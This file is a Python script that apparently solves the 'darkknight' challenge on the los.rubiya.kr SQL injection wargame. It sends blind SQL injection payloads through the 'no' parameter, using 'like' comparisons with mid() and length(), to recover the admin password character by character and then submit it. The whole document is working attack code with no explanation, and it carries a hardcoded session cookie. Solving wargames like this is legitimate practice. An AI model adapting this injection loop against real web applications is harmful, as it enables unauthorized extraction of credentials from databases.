import requests
from string import ascii_letters,digits

url = "https://los.rubiya.kr/chall/darkknight_5cfbc71e68e09f1b039a8204d1a81456.php"
cookie = {"PHPSESSID":"7i0pju9093hcuinap2nnrb9jlu"}

def GET(params, msg = "Hello admin"):
    if requests.get(url, params, cookies = cookie).text.find(msg) > 0:
        return True
    else:
        return False

length = 0
default = "0||id like \"admin\" and "
while True:
    if GET({"no":default + f"length(pw) like {length}#"}):break
    else: length += 1

pw = ""
for i in range(1, length + 1):
    for j in ascii_letters + digits:
        if GET({"no":default + f"mid(pw,{i},1) like \"{j}\"#"}):
            pw += j
            break

if GET({"pw":pw},"Clear!"): print("[*] Success")
